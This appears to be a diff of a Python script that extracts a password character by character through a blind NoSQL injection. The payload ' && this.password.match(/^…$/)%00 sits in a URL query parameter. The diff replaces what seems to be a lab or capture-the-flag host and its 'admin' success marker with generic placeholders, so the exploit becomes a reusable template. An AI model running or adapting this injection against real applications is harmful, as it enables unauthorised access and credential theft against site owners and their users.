@@ -18,10 +18,10 @@ def main():
 	print(''.join(map(str,key)))
 
 def request():
-	url = "http://ptl-8e00bff4-c65e2d45.libcurl.st/?search=admin'%20%26%26%20this.password.match(/^"+''.join(map(str,key))+"$/)%00"
+	url = "<domain URL>?<var>=abc'%20%26%26%20this.password.match(/^"+''.join(map(str,key))+"$/)%00"
 	page = urlopen(url)
 	html = str(page.read())
-	if html.find("admin</a>") >= 0:
+	if html.find("A word that you need find") >= 0:
 		return 1
 
 main()
